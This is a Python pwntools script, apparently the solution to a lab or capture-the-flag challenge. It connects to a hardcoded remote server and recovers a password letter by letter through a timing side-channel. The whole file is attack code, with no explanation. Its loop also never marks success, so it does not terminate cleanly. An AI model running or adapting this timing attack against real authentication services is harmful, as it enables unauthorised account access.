#!/usr/bin/python3

from pwn import *
import sys
import itertools
import random
import string

HOST = '141.85.224.104'
PORT = 20102

def is_right_guess(io, guess):
    io.sendline(guess)

    received_line = io.recvline().strip()

    return (received_line[:3] != b'Try', received_line[received_line.find(b':') + 2:])

def break_password(isLocal = 1):
    io = None

    if isLocal:
        io = remote('127.0.0.1', PORT)
    else:
        io = remote(HOST, PORT)

    io.recvuntil(b'Start playing!\n')

    partial_password = []
    isGuessed = False
    while not isGuessed:
        partial_password.append('a')

        max_time = 0
        max_time_letter = 'a'
        for letter in string.ascii_lowercase:
            partial_password[-1] = letter
            potential_password = ''.join(partial_password)

            print('Trying guess: {}'.format(potential_password))

            (is_right, time_taken) = is_right_guess(io, potential_password)

            if not is_right:
                if float(time_taken) > max_time:
                    max_time = float(time_taken)
                    max_time_letter = letter
            else:
                print(time_taken)
                break

        partial_password[-1] = max_time_letter

def main():
    isLocal = True
    if len(sys.argv) == 2:
        isLocal = bool(int(sys.argv[1]))

    break_password(isLocal)

if __name__ == '__main__':
    main()
